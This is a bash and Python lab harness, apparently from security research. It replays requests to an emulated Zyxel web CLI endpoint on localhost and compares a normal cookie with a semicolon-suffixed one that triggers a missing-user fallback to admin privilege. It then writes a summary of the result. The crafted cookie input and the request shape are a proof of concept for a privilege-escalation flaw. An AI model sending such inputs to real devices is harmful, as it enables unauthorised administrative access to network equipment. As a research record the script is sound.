#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT_DIR/tools/zyxel_bwrap_env.sh"
source "$ROOT_DIR/tools/zyxel_manual_core_lane.sh"

RUNROOT="$ROOT_DIR/runroot"
STATE_DIR="$ROOT_DIR/.lab-state"
ARTIFACT_ROOT="$ROOT_DIR/live_artifacts"
LABEL="${1:-cookie_desync_backend_compare_20260421a}"
ARTIFACT_DIR="$ARTIFACT_ROOT/$LABEL"
SUMMARY_OUT="$ARTIFACT_DIR/summary.txt"
TRACE_PREFIX_BASE="$ARTIFACT_DIR/zyshd.hosttrace"

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Missing dependency: $1" >&2
    exit 1
  }
}

ensure_file() {
  local path="$1"
  [[ -f "$path" ]] || : >"$path"
}

status_from_headers() {
  awk 'NR==1 {print $2}' "$1" 2>/dev/null || true
}

body_bytes() {
  if [[ -f "$1" ]]; then
    wc -c <"$1" | tr -d ' '
  else
    printf '0\n'
  fi
}

copy_if_present() {
  local src="$1"
  local dst="$2"
  if [[ -f "$src" ]]; then
    cp -f "$src" "$dst"
  else
    : >"$dst"
  fi
}

stop_lab() {
  zyxel_stop_manual_core_lane
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >/dev/null 2>&1 || true
}

kill_pid_tree() {
  local pid="${1:-}"
  if [[ -z "$pid" ]]; then
    return 0
  fi
  pkill -TERM -P "$pid" 2>/dev/null || true
  kill -TERM "$pid" 2>/dev/null || true
  sleep 1
  pkill -KILL -P "$pid" 2>/dev/null || true
  kill -KILL "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
}

start_lane() {
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >"$ARTIFACT_DIR/pre_stop.log" 2>&1 || true
  zyxel_start_manual_core_lane "$ROOT_DIR" "$RUNROOT" "$STATE_DIR" 1 testtoken "$LABEL" >"$ARTIFACT_DIR/start_core.log" 2>&1
  zyxel_start_manual_lighttpd "$RUNROOT" "$STATE_DIR" "$LABEL" >"$ARTIFACT_DIR/manual_lighttpd.log" 2>&1
}

start_attached_trace() {
  local case_name="$1"
  local trace_prefix="${TRACE_PREFIX_BASE}.${case_name}"
  rm -f "${trace_prefix}".*
  strace \
    -ff \
    -tt \
    -s 256 \
    -yy \
    -e trace=execve,clone,fork,vfork,wait4,openat,read,write,msgrcv,msgsnd,unlink,unlinkat \
    -o "$trace_prefix" \
    -p "${ZYXEL_MANUAL_ZYSHD_PID:?missing manual zyshd pid}" \
    >/dev/null 2>&1 &
  ZYXEL_MANUAL_TRACE_PID=$!
  sleep 1
}

stop_attached_trace() {
  kill_pid_tree "${ZYXEL_MANUAL_TRACE_PID:-}"
  ZYXEL_MANUAL_TRACE_PID=""
}

run_case() {
  local case_name="$1"
  local cookie_header="$2"
  local case_dir="$ARTIFACT_DIR/$case_name"
  local headers_file="$case_dir/headers.txt"
  local body_file="$case_dir/body.bin"
  local curl_stderr="$case_dir/curl.stderr.txt"
  local lighttpd_delta="$case_dir/lighttpd.delta.txt"
  local cgi_dump="$case_dir/zysh-cgi.dump.txt"
  local clidump="$case_dir/clidump.gui.txt"
  local trace_prefix="${TRACE_PREFIX_BASE}.${case_name}"
  local lighttpd_log="$STATE_DIR/${LABEL}_lighttpd.log"
  local lighttpd_before

  mkdir -p "$case_dir"
  rm -f "$headers_file" "$body_file" "$curl_stderr" "$lighttpd_delta" "$cgi_dump" "$clidump"
  rm -f "${trace_prefix}".*
  rm -f "$RUNROOT/tmp/zysh-cgi.dump" "$RUNROOT/db/etc/zyxel/ftp/tmp/clidump.gui"

  start_attached_trace "$case_name"
  lighttpd_before=0
  if [[ -f "$lighttpd_log" ]]; then
    lighttpd_before="$(wc -l <"$lighttpd_log" | tr -d ' ')"
  fi

  curl -sS --max-time 20 \
    -D "$headers_file" \
    -o "$body_file" \
    -H 'Host: 127.0.0.1:8080' \
    -H "Cookie: $cookie_header" \
    -X POST \
    --data 'filter=js2' \
    --data-urlencode 'cmd=show running-config' \
    --data 'write=0' \
    'http://127.0.0.1:8080/cgi-bin/zysh-cgi' \
    > /dev/null 2>"$curl_stderr" || true
  ensure_file "$headers_file"
  ensure_file "$body_file"

  sleep 1
  stop_attached_trace

  if [[ -f "$lighttpd_log" ]]; then
    tail -n +"$((lighttpd_before + 1))" "$lighttpd_log" >"$lighttpd_delta" || true
  else
    : >"$lighttpd_delta"
  fi
  copy_if_present "$RUNROOT/tmp/zysh-cgi.dump" "$cgi_dump"
  copy_if_present "$RUNROOT/db/etc/zyxel/ftp/tmp/clidump.gui" "$clidump"
}

need_cmd curl
need_cmd python3
need_cmd qemu-aarch64-static
need_cmd ss
need_cmd strace

mkdir -p "$ARTIFACT_DIR"
trap stop_lab EXIT

start_lane
run_case baseline 'authtok=testtoken'
run_case semicolon_suffix 'authtok=testtoken; foo=bar'

python3 - "$ARTIFACT_DIR" "$SUMMARY_OUT" <<'PY'
import re
import sys
from pathlib import Path

artifact_dir = Path(sys.argv[1])
summary_path = Path(sys.argv[2])

def first_status(path: Path) -> str:
    if not path.exists():
        return ""
    first = path.read_text(errors="ignore").splitlines()
    if not first:
        return ""
    parts = first[0].split()
    return parts[1] if len(parts) > 1 else ""

def body_bytes(path: Path) -> int:
    return path.stat().st_size if path.exists() else 0

def contains(path: Path, needle: str) -> bool:
    return path.exists() and needle in path.read_text(errors="ignore")

def trace_key_lines(case_name: str) -> list[str]:
    lines: list[str] = []
    for path in sorted(artifact_dir.glob(f"zyshd.hosttrace.{case_name}.*")):
      for line in path.read_text(errors="ignore").splitlines():
        if (
            "/tmp/zysh.client." in line
            or "msgrcv(" in line
            or "msgsnd(" in line
            or ('execve("/usr/bin/zysh"' in line)
            or "% Insufficient privilege" in line
        ):
          lines.append(line.strip())
    return lines

cases = []
for case_name in ("baseline", "semicolon_suffix"):
    case_dir = artifact_dir / case_name
    cases.append({
        "name": case_name,
        "http": first_status(case_dir / "headers.txt"),
        "body_bytes": body_bytes(case_dir / "body.bin"),
        "fallback": contains(case_dir / "zysh-cgi.dump.txt", "set to type admin"),
        "user_type_guest": contains(case_dir / "zysh-cgi.dump.txt", "user type: 1"),
        "configure_terminal": contains(case_dir / "clidump.gui.txt", "configure terminal"),
        "insufficient": contains(case_dir / "lighttpd.delta.txt", "% Insufficient privilege"),
        "trace_lines": trace_key_lines(case_name),
    })

summary: list[str] = [
    "result_class=cookie_desync_backend_compare",
    "date=2026-04-22",
]
for case in cases:
    prefix = case["name"]
    summary.extend([
        f"{prefix}_http={case['http']}",
        f"{prefix}_body_bytes={case['body_bytes']}",
        f"{prefix}_fallback={'yes' if case['fallback'] else 'no'}",
        f"{prefix}_guest_user_type={'yes' if case['user_type_guest'] else 'no'}",
        f"{prefix}_configure_terminal={'yes' if case['configure_terminal'] else 'no'}",
        f"{prefix}_insufficient_privilege={'yes' if case['insufficient'] else 'no'}",
        f"{prefix}_trace_key_line_count={len(case['trace_lines'])}",
    ])

trace_signal = any(case["trace_lines"] for case in cases)
summary.extend([
    "",
    "[interpretation]",
    "- The healthy-seam baseline and the semicolon cookie-desync case were replayed in the same manual `core` lane using the same `show running-config` request shape.",
    "- The baseline stays on the normal guest path: `zysh-cgi.dump` logs `user type: 1` and `clidump.gui` stages only `enable` plus `show running-config`.",
    "- The semicolon desync case reaches the missing-user fallback again: `zysh-cgi.dump` logs `can't found user ... set to type admin` and `clidump.gui` adds `configure terminal` before `show running-config`.",
    "- Both requests still finish as `HTTP 200` headers plus curl timeout with no body, so the live web lane still bottoms out before a returned config payload.",
])
if trace_signal:
    summary.extend([
        "- The attached `zyshd` trace captured backend key lines for the same run and can be used as supportive evidence for how the backend consumes the request.",
    ])
else:
    summary.extend([
        "- The attached `zyshd` trace stayed low-signal on this run and should be treated as diagnostic only; the decisive evidence here is the same-run staging split, not a proven backend-state flip.",
    ])
summary.extend([
    "- This still supports the current root-cause position: the parser desync is real, but the live lane still stops short of privileged output.",
    "",
    "[backend trace excerpts]",
])

for case in cases:
    summary.append(f"- {case['name']}:")
    if case["trace_lines"]:
        for line in case["trace_lines"][:4]:
            summary.append(f"  {line}")
    else:
        summary.append("  no matched backend key lines captured")

summary.extend([
    "",
    "[artifacts]",
    f"- {artifact_dir / 'baseline' / 'headers.txt'}",
    f"- {artifact_dir / 'baseline' / 'body.bin'}",
    f"- {artifact_dir / 'baseline' / 'zysh-cgi.dump.txt'}",
    f"- {artifact_dir / 'baseline' / 'clidump.gui.txt'}",
    f"- {artifact_dir / 'semicolon_suffix' / 'headers.txt'}",
    f"- {artifact_dir / 'semicolon_suffix' / 'body.bin'}",
    f"- {artifact_dir / 'semicolon_suffix' / 'zysh-cgi.dump.txt'}",
    f"- {artifact_dir / 'semicolon_suffix' / 'clidump.gui.txt'}",
])

summary_path.write_text("\n".join(summary) + "\n")
PY

printf 'Artifact: %s\n' "$ARTIFACT_DIR"
printf 'Summary: %s\n' "$SUMMARY_OUT"
